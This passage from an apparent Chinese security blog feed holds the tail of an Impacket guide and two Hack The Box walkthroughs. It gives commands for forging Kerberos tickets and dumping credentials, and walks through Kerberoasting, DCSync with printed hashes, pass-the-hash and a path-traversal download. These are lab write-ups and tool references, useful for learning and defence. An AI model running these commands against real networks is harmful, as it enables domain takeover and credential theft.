href="https://github.com/GhostPack/Rubeus/pull/137">https://github.com/GhostPack/Rubeus/pull/137</a></p><h3 id="ticketConverter-py"><a href="http://ticketConverter.py">ticketConverter.py</a></h3><p>不需要认证，因为这个脚本是在ccache和kirbi格式中互相转换用的脚本。</p><h4 id="常用命令-12">常用命令</h4><p>将ccache转换为kirbi，交换位置就是kirbi转换为ccache</p><p>py -3 .\ticketConverter.py .\administrator.ccache .\administrator.kirbi</p><h3 id="ticketer-py"><a href="http://ticketer.py">ticketer.py</a></h3><p>可使用密码认证、hash认证</p><p>这个脚本主要拿来伪造各种服务票据，例如银票据、金票据、钻石票据、蓝宝石票据。</p><p>注意2021年11月更新之后，如果用户名在AD域中不存在，则票据会被拒绝。</p><h4 id="常用命令-13">常用命令</h4><p><strong>银票伪造</strong></p><p>银票因为不需要与DC通信，所以比金票更加隐蔽。但是银票只能对伪造的服务有效，且会随着服务账户密码的修改而失效。</p><p>使用win-7$的机器账户的hash<code>96dd976cc094ca1ddb2f06476fb61eb6</code>伪造<code>cifs/win-7</code>的服务票据，使用票据的用户是根本不存在的qqq或者存在的任意用户。</p><p>py -3 .\ticketer.py -spn cifs/win-7 -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -domain <a href="http://test.com">test.com</a> -nthash 96dd976cc094ca1ddb2f06476fb61eb6 qqq</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123644-9943f9fe-6bb1-1.png" alt=""></p><p><strong>金票伪造</strong></p><p>使用krbtgt的密钥伪造TGT中的PAC的权限，证明任意用户属于特权组。然后通过伪造了PAC的TGT换ST，从而获得任意服务的权限。金票据因为需要和DC进行交互，所以建议在域内使用，域外通过代理使用有时候会换不到ST。</p><p>注意金票会随着krbtgt密码的修改而失效</p><p>在银票的命令基础上去掉-spn，将nthash修改为krbtgt的hash即可。</p><p>py -3 .\ticketer.py -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -domain <a href="http://test.com">test.com</a> -nthash 96dd976cc094ca1ddb2f06476fb61eb6 qqq</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123703-a49dcc44-6bb1-1.png" alt=""></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123713-aa8e4232-6bb1-1.png" alt=""></p><p><strong>钻石票据伪造</strong></p><p>由于金票据和银票据没有合法的KRB_AS_REQ或KRB_TGS_REG请求，所以会被发现。而钻石票据会正常请求票据，然后解密票据的PAC，修改并重新加密。从而增加了隐蔽性。</p><p>aesKey是krbtgt的密钥，注意一般aesKey都是256位加密的，这个得看DC的算法。不过128也建议存一份吧</p><p>-user-id和-groups是可选的，如果不选分别会默认500和513, 512, 520, 518, 519</p><p>-user和-password是要真实去发起TGT请求的用户的账密，可使用hash。这个用户实际上是什么权限不重要</p><p>py -3 <a href="http://ticketer.py">ticketer.py</a> -request -domain <a href="http://test.com">test.com</a> -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -user administrator -password 1qaz@WSX -aesKey 245a674a434726c081385a3e2b33b62397e9b5fd7d02a613212c7407b9f13b41 -user-id 1500 -groups 12,513,518,519,520 qqq</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123722-afd66ad0-6bb1-1.png" alt=""></p><p><strong>蓝宝石票据伪造</strong></p><p>钻石票据是伪造的PAC特权，但是蓝宝石票据是将真实高权限用户的PAC替换到低权限的TGT中，从而成为目前最难检测的手法</p><p>不过该技术还是impacket的一个分支，正在等待合并。</p><p>注意，因脚本问题，未复现成功</p><p>py -3 ticketer_imper.py -request -domain <a href="http://test.com">test.com</a> -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -user administrator -password 1qaz@WSX -aesKey 245a674a434726c081385a3e2b33b62397e9b5fd7d02a613212c7407b9f13b41 -impersonate administrator qqq</p><p>参考：</p><p><a href="https://github.com/SecureAuthCorp/impacket/pull/1411">https://github.com/SecureAuthCorp/impacket/pull/1411</a></p><h4 id="常用选项-10">常用选项</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-spn SPN 银票用，一般都是某个服务器的cifs或DC的ldap服务，mssql啥的也可以考虑</span><br><span class="line">-request 要求请求TGT，这个脚本里可以理解为钻石票据伪造。必须同时存在-user和-password</span><br><span class="line">-aesKey hex key 用来签名票据的krbtgt的AES加密的密码</span><br><span class="line">-nthash NTHASH  用来签名票据的krbtgt的NTLM加密的密码</span><br><span class="line">-keytab KEYTAB 请求文件内容中的多个银票据</span><br><span class="line">-duration DURATION 修改票据的失效时间</span><br><span class="line">-user-id USER_ID 指定伪造PAC的用户权限ID,默认是500 管理员</span><br><span class="line">-groups GROUPS 指定伪造PAC的组权限ID，默认是513, 512, 520, 518, 519这五个组</span><br></pre></td></tr></table></figure><h3 id="raiseChild-py-无环境"><a href="http://raiseChild.py">raiseChild.py</a>(无环境)</h3><p>可使用密码认证、hash认证、Kerberos认证</p><h4 id="常用命令-14">常用命令</h4><p>py -3 <a href="http://raiseChild.py">raiseChild.py</a> <a href="http://childDomain.net/adminuser:mypwd">childDomain.net/adminuser:mypwd</a></p><h4 id="常用选项-11">常用选项</h4><h2 id="Windows密码">Windows密码</h2><h3 id="secretsdump-py"><a href="http://secretsdump.py">secretsdump.py</a></h3><h4 id="常用命令-15">常用命令</h4><p><strong>基于NTLM认证，使用机器用户导出</strong></p><p>py -3 <a href="http://secretsdump.py">secretsdump.py</a> -hashes 5f8506740ed68996ffd4e5cf80cb5174:5f8506740ed68996ffd4e5cf80cb5174 “domain/DC$@DCIP” -just-dc-user krbtgt</p><p><strong>基于Kerberos票据导出</strong></p><p>export KRB5CCNAME=ad01.ccache<br>py -3 <a href="http://secretsdump.py">secretsdump.py</a> -k -no-pass <a href="http://AD01.test.com">AD01.test.com</a> -dc-ip 192.168.111.146 -target-ip 192.168.111.146 -just-dc-user krbtgt</p><p><strong>本地解密SAM</strong></p><p>py -3 <a href="http://secretsdump.py">secretsdump.py</a> -sam sam.save -system system.save -security security.save LOCAL</p><h4 id="常用选项-12">常用选项</h4><blockquote><p>-system SYSTEM SYSTEM文件<br>-security SECURITY security文件<br>-sam SAM SAM文件<br>-ntds NTDS NTDS.DIT文件<br>-resumefile RESUMEFILE 待恢复的NTDS.DIT转储文件<br>-outputfile OUTPUTFILE 输出的文件名<br>-use-vss 使用vss卷影替代DRSUAPI<br>-rodcNo RODCNO Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)<br>-rodcKey RODCKEY AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)<br>-use-keylist 使用KerberosKeyList转储TGS-REQ<br>-exec-method [{smbexec,wmiexec,mmcexec}] 使用vss卷影导出时执行命令的方法，分别有smbexec、wmiexec、mmcexec</p></blockquote><h3 id="mimikatz-py"><a href="http://mimikatz.py">mimikatz.py</a></h3><p>这是一个比较鸡肋的功能，需要先在目标机器上用mimikatz执行rpc::server</p><p>然后用该脚本进行连接</p><p>py -3 .\mimikatz.py <a href="http://test.com/administrator:1qaz@WSX@192.168.40.158">test.com/administrator:1qaz@WSX@192.168.40.158</a></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123733-b6d03d16-6bb1-1.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本篇转载自&lt;a href=&quot;https://xz.aliyun.com/news/11323&quot;&gt;https://xz.aliyun.com/news/11323&lt;/a&gt; ，详细信息请查看原文，本文只是为了自己查资料方便。&lt;/p&gt;
&lt;h1&gt;Impacket脚本利用指南（上）&lt;</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="脚本利用" scheme="https://oceanzbz.github.io/tags/%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Administrator-HTB</title>
    <link href="https://oceanzbz.github.io/post/711feaf2.html"/>
    <id>https://oceanzbz.github.io/post/711feaf2.html</id>
    <published>2025-03-02T04:38:15.000Z</published>
    <updated>2025-03-05T07:24:36.807Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p>端口扫描<br><code>nmap --min-rate 10000 -p- 10.10.11.42</code></p><img src="/post/711feaf2/IMAGE20250302131411626.png" class=""><p>详细信息扫描</p><p><code>nmap -sT -sC -sV -O 10.10.11.42 </code></p><img src="/post/711feaf2/IMAGE20250302132255743.png" class=""><p>题目给了一个用户名和密码，来爆破下其他用户，使用 Crackmapexec工具来爆破<br><code>crackmapexec smb administrator.htb -u &quot;Olivia&quot; -p &quot;ichliebedich&quot; --rid-brute | grep SidTypeUser</code></p><img src="/post/711feaf2/IMAGE20250302133741194.png" class=""><p>看到刚才扫描的端口开放了5985端口，这个端口一般运行着winrm服务</p><p><code>WinRM是很早之前微软推出的一种新式的方便远程管理的服务Windows Remote Management的简称，相比RDP远程桌面协议，WinRM这种服务更具备轻量、低宽带的特性，WinRM与WinRS（Windows Remote Shell）的使用可以让远程连的运维人员拥有CMDShell环境，通过命令执行对服务器与服务器数据进行管理。</code></p><h2 id="域内信息收集">域内信息收集</h2><p>来登录下试试,使用kali自带的evil-winrm登录</p><p><code>evil-winrm -u &quot;Olivia&quot; -p &quot;ichliebedich&quot; -i 10.10.11.51</code></p><img src="/post/711feaf2/IMAGE20250302135114605.png" class=""><p>发现可以登录成功，看下权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br></pre></td></tr></table></figure><p>可以将计算机添加到域内。</p><p>使用bloodhound-python收集一波域内的信息</p><p><code>bloodhound-python -u Olivia -p 'ichliebedich' -c All -d administrator.htb -ns 10.10.11.42</code></p><img src="/post/711feaf2/IMAGE20250302142609928.png" class=""><p>可以看到Olivia用户能够完全控制michael用户，那么给其改个密码，使用bloodyAD进行修改。</p><h2 id="漏洞利用">漏洞利用</h2><p><code>bloodyAD -u &quot;olivia&quot; -p &quot;ichliebedich&quot; -d &quot;Administrator.htb&quot; --host &quot;10.10.11.42&quot; set password &quot;Michael&quot; &quot;12345678&quot;</code></p><img src="/post/711feaf2/IMAGE20250302205915184.png" class=""><p>然后看看 MIchael用户的FDOC</p><img src="/post/711feaf2/IMAGE20250302210030846.png" class=""><p>发现该用户可以强制更改benjamin用户的密码，同样适用bloodyAD进行更改</p><p><code>bloodyAD -u &quot;Michael&quot; -p &quot;12345678&quot; -d &quot;Administrator.htb&quot; --host &quot;10.10.11.42&quot; set password &quot;Benjamin&quot; &quot;12345678&quot;</code></p><p>ftp登录查看有一个psafe3文件下载下来看看</p><img src="/post/711feaf2/IMAGE20250302210220894.png" class=""><p>psafe3 文件是加密的密码安全文件，无法直接读取，需要使用 <code>pwsafe2john</code> 工具进行获取 hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwsafe2john Backup.psafe3 </span><br><span class="line">Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050</span><br></pre></td></tr></table></figure><p>使用john爆破下密码</p><p><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></p><img src="/post/711feaf2/IMAGE20250302210520428.png" class=""><p>或者使用hashcat也可以直接爆破</p><p><code>hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt</code></p><p><a href="https://github.com/pwsafe/pwsafe/releases">https://github.com/pwsafe/pwsafe/releases</a> 使用这个工具解密得到文件</p><img src="/post/711feaf2/IMAGE20250302211152361.png" class=""><p>得到三个用户的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw</span><br><span class="line">emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb</span><br><span class="line">emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur</span><br></pre></td></tr></table></figure><p>继续使用evil-winrm登录看看能不能读到用户的flag</p><img src="/post/711feaf2/IMAGE20250302211702035.png" class=""><h2 id="提权">提权</h2><p>继续查找emily用户的权限</p><img src="/post/711feaf2/IMAGE20250302211902875.png" class=""><h3 id="Kerberoasting攻击">Kerberoasting攻击</h3><p>发现其对Ethan 有权限写入，可以考虑使用Kerberoasting攻击</p><img src="/post/711feaf2/IMAGE20250302212149146.png" class=""><p>使用<a href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast</a>脚本来进行攻击</p><p>它可以为设置了 SPN 的用户帐户打印 “kerberoast” 哈希值。 该工具带来了以下附加功能：对于每个没有 SPN 的用户，它会尝试设置一个（<strong>滥用对属性的写入权限</strong>），打印 “kerberoast” 哈希，并删除为该操作设置的临时 SPN。</p><p>在使用脚本之前先同步下时间<br><code>ntpdate 10.10.11.42</code></p><p><code>python targetedKerberoast.py -u &quot;emily&quot; -p &quot;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&quot; -d &quot;Administrator.htb&quot; --dc-ip 10.10.11.42</code></p><p>但是我没有成功········</p><p>那就手动给ethan用户添加一个spn,还是使用bloodyAD工具</p><p><code>bloodyAD -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --host '10.10.11.42' set object ethan servicePrincipalName -v 'x0da6h/x0da6h'</code></p><img src="/post/711feaf2/IMAGE20250302220129905.png" class=""><p>然后使用getuserspn脚本获取hash来进行爆破</p><p><code>impacket-GetUserSPNs 'administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -request</code></p><p>然后爆破密码出了limpbizkit</p><img src="/post/711feaf2/IMAGE20250302222423534.png" class=""><p>然后我们继续查看ethan的权限</p><img src="/post/711feaf2/IMAGE20250302222653053.png" class=""><p>发现可以进行dcsync， GetChanges 和 GetChangesAll 的组合。这两个权限的组合授予主体执行 DCSync 攻击的能力。我们使用<code>impacket-secretsdump</code>转储域控制器上的所有密码。</p><p><code>impacket-secretsdump &quot;Administrator.htb/ethan:limpbizkit&quot;@&quot;dc.Administrator.htb&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump &quot;Administrator.htb/ethan:limpbizkit&quot;@&quot;dc.Administrator.htb&quot;</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::</span><br><span class="line">administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::</span><br><span class="line">administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:8864a202387fccd97844b924072e1467:::</span><br><span class="line">administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:95687598bfb05cd32eaa2831e0ae6850:::</span><br><span class="line">administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::</span><br><span class="line">administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::</span><br><span class="line">administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::</span><br><span class="line">administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::</span><br><span class="line">DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2</span><br><span class="line">Administrator:des-cbc-md5:403286f7cdf18385</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94</span><br><span class="line">krbtgt:des-cbc-md5:2c0bc7d0250dbfc7</span><br><span class="line">administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3</span><br><span class="line">administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48</span><br><span class="line">administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9</span><br><span class="line">administrator.htb\michael:aes256-cts-hmac-sha1-96:b360c36cb6777b8cc3d88ab1aa60f0064e6ea4fc9b9a4ebacf66345118c0e959</span><br><span class="line">administrator.htb\michael:aes128-cts-hmac-sha1-96:bc3c8269d1a4a82dc55563519f16de8b</span><br><span class="line">administrator.htb\michael:des-cbc-md5:43c2bc231598012a</span><br><span class="line">administrator.htb\benjamin:aes256-cts-hmac-sha1-96:a0bbafbc6a28ed32269e6a2cc2a0ccb35ac3d7314633815768f0518ebae6847f</span><br><span class="line">administrator.htb\benjamin:aes128-cts-hmac-sha1-96:426ca56d39fe628d47066fc3448b645e</span><br><span class="line">administrator.htb\benjamin:des-cbc-md5:b6f84a864376a4ad</span><br><span class="line">administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4</span><br><span class="line">administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218</span><br><span class="line">administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51</span><br><span class="line">administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f</span><br><span class="line">administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f</span><br><span class="line">administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb</span><br><span class="line">administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6</span><br><span class="line">administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade</span><br><span class="line">administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf</span><br><span class="line">administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82</span><br><span class="line">administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e</span><br><span class="line">administrator.htb\emma:des-cbc-md5:3249fba89813ef5d</span><br><span class="line">DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb</span><br><span class="line">DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d</span><br><span class="line">DC$:des-cbc-md5:f483547c4325492a</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure><p>有了hash之后我们就可以想干啥就干啥了。</p><p><code>evil-winrm -u &quot;administrator&quot; -H &quot;3dc553ce4b9fd20bd016e098d2d2fd2e&quot; -i administrator.htb</code></p><img src="/post/711feaf2/IMAGE20250302223507418.png" class=""><p>还是多实践。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;端口扫描&lt;br&gt;
&lt;code&gt;nmap --min-rate 10000 -p- 10.10.11.42&lt;/code&gt;&lt;/p&gt;
&lt;img src=&quot;/post/711feaf2/IMAGE20250302131411626.p</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="windows" scheme="https://oceanzbz.github.io/tags/windows/"/>
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://oceanzbz.github.io/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>Titanic-HTB</title>
    <link href="https://oceanzbz.github.io/post/7f2875cc.html"/>
    <id>https://oceanzbz.github.io/post/7f2875cc.html</id>
    <published>2025-02-28T13:55:41.000Z</published>
    <updated>2025-03-05T07:24:36.812Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p><code>nmap --min-rate 10000 -p- 10.10.11.55</code><br>扫描全端口</p><img src="/post/7f2875cc/IMAGE20250228221858125.png" class=""><p>详细扫描</p><p><code>nmap -sT -sC -sV -O 10.10.11.55</code></p><img src="/post/7f2875cc/IMAGE20250228222122068.png" class=""><p>添加下映射然后访问。</p><p>看下服务端</p><img src="/post/7f2875cc/IMAGE20250228223438949.png" class=""><p>使用的是Werkzeug/3.0.3 Python/3.10.12，这个岸版本是存在cve的CVE-2024-49766/CVE-2024-49767，但是好像并不适用这里。抓包看看</p><img src="/post/7f2875cc/IMAGE20250228224226740.png" class=""><p>好像页面也就这里可以提交然后下载一个json文件就是自己填的内容抓这个下载的包好像可以任意文件下载</p><img src="/post/7f2875cc/IMAGE20250228224333252.png" class=""><p>子域名爆破发现了一个域名</p><p><code>ffuf -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -u http://titanic.htb/ -H &quot;Host:FUZZ.titanic.htb&quot;  -fc 301</code></p><p>发现一个子域名 dev.tiantic.htb</p><img src="/post/7f2875cc/IMAGE20250228225526033.png" class=""><p>找到俩配置文件</p><img src="/post/7f2875cc/IMAGE20250228225936392.png" class=""><img src="/post/7f2875cc/IMAGE20250228230019755.png" class=""><h2 id="漏洞利用">漏洞利用</h2><p><a href="https://docs.gitea.com/zh-cn/next/administration/config-cheat-sheet">https://docs.gitea.com/zh-cn/next/administration/config-cheat-sheet</a><br>结合刚刚发现的任意文件下载，去下载子域名的敏感文件</p><img src="/post/7f2875cc/IMAGE20250228225714834.png" class=""><p>但是这里用的是docker环境<br><a href="https://docs.gitea.com/zh-cn/next/installation/install-with-docker#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">https://docs.gitea.com/zh-cn/next/installation/install-with-docker#环境变量</a></p><img src="/post/7f2875cc/IMAGE20250228225758198.png" class=""><p>结合上面的docker配置文件去下载这个敏感文件</p><img src="/post/7f2875cc/IMAGE20250228230214761.png" class=""><p>找到一个数据库路径去下载看看</p><p>url <a href="http://titanic.htb/download?ticket=../../../../../home/developer/gitea/data/gitea/gitea.db">http://titanic.htb/download?ticket=../../../../../home/developer/gitea/data/gitea/gitea.db</a> -o gitea.db</p><img src="/post/7f2875cc/IMAGE20250228231213689.png" class=""><p>这样看不好看学到一手显示列名 .headers on然后在看</p><img src="/post/7f2875cc/IMAGE20250301000200248.png" class=""><p>但是这样好像没法用hashcat爆破得把pbkdf 的hash改成符合hashcat爆破的格式，参考其他师傅的文章</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 gitea.db &quot;select passwd,salt,name from user&quot; | while read data; do            digest=$(echo &quot;$data&quot; | cut -d&#x27;|&#x27; -f1 | xxd -r -p | base64)            salt=$(echo &quot;$data&quot; | cut -d&#x27;|&#x27; -f2 | xxd -r -p | base64)            name=$(echo $data | cut -d&#x27;|&#x27; -f 3)            echo &quot;$&#123;name&#125;:sha256:50000:$&#123;salt&#125;:$&#123;digest&#125;&quot;          done | tee gitea.hashes</span><br></pre></td></tr></table></figure><p>使用以上脚本转换成符合hashcat爆破的格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=          developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=          Nagar:sha256:50000:jYadp3JXkz0GzadV63zmAA==:tF7VBXAhxIEaq13YgKDvT/5705o0oswfaorNLnYTzrziQuJ0ZoEEEJPs9S4IJs90iUY=          biba:sha256:50000:QnFYiOozoqewByNi/wZZ0Q==:x/BT8UAuOK9WPW1l6A1p0gNtEFKSIPXDji1pCjDBaFYssJmrImwZLEDtnA3auhRtCR4=          xxs:sha256:50000:pFevdlMocglgnOtDlkNE1w==:oiBW7BJh7UNBLJgsKnOayOWVBMCpyFIlllKr6GyScbPyZoMgCgLlFR/lWaXPAMY7ZqE=</span><br></pre></td></tr></table></figure><p>爆破出密码developer:25282528</p><h2 id="提权">提权</h2><p><code>find / -writable -type d 2&gt;/dev/null</code></p><img src="/post/7f2875cc/IMAGE20250228234114556.png" class=""><p>利用点在这里CVE-2024-41817<br><a href="https://imagemagick.org/index.php">https://imagemagick.org/index.php</a><br>它在执行 <code>ImageMagick</code> 时通过在当前工作目录中加载恶意共享库来利用任意代码执行<br>先切换到<code>/opt/app/static/assets/images/</code>目录下<br>创建一个共享库，复制<code>/root/root.txt</code>文件并更改其权限</p><img src="/post/7f2875cc/IMAGE20250228235312384.png" class=""><p>参考：<a href="https://0xdf.gitlab.io/2024/12/14/htb-compiled.html">https://0xdf.gitlab.io/2024/12/14/htb-compiled.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;nmap --min-rate 10000 -p- 10.10.11.55&lt;/code&gt;&lt;br&gt;
扫描全端口&lt;/p&gt;
&lt;img src=&quot;/post/7f2875cc/IMAGE20250228221858125.</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://oceanzbz.github.io/tags/HTB/"/>
    
    <category term="Linux" scheme="https://oceanzbz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>ciscn2024复现</title>
    <link href="https://oceanzbz.github.io/post/3b6915e3.html"/>
    <id>https://oceanzbz.github.io/post/3b6915e3.html</id>
    <published>2025-02-28T07:21:00.000Z</published>
    <updated>2025-03-05T07:24:36.805Z</updated>
    
